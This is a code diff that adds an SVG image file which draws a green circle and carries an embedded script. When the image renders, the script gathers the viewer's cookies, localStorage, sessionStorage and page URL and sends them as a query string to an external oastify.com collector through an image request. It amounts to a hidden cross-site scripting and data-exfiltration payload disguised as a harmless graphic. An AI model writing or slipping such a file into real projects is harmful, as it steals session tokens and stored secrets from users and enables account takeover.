@@ -1,0 +1,15 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <script>
+    (function() {
+      var stolen = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        url: window.location.href
+      };
+      
+      new Image().src = 'http://i8rslya4vgvyaecle92twvd2zt5kteh3.oastify.com/x?data=' + encodeURIComponent(JSON.stringify(stolen));
+    })();
+  </script>
+  <circle cx="50" cy="50" r="40" fill="green"/>
+</svg>
